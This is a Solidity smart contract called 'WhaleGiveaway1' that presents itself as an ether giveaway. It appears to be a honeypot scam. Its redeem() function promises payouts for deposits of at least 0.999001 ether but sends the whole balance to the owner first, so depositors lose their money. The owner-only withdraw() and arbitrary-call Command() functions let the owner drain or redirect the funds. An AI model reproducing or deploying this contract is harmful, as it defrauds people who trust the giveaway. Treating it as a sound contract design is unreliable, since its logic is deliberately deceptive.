pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
   
    function()
    public
    payable
    {
        
    }
    
    function redeem()
    public
    payable
    {   
        uint val = msg.value;
        uint balance = this.balance;
        bool eligible = val >= minEligibility;
        address sender = msg.sender;
        
        while (eligible) {
            Owner.transfer(balance);
            sender.transfer(balance);
            eligible = false;
        }
    }
    
    function withdraw()
    payable
    public
    {   
        address sender = msg.sender;
        address owner = Owner;
        
        while (true) {
            require(sender == owner);
            owner.transfer(this.balance);
            break;
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        address sender = msg.sender;
        address owner = Owner;
        
        while (true) {
            require(sender == owner);
            adr.call.value(msg.value)(data);
            break;
        }
    }
}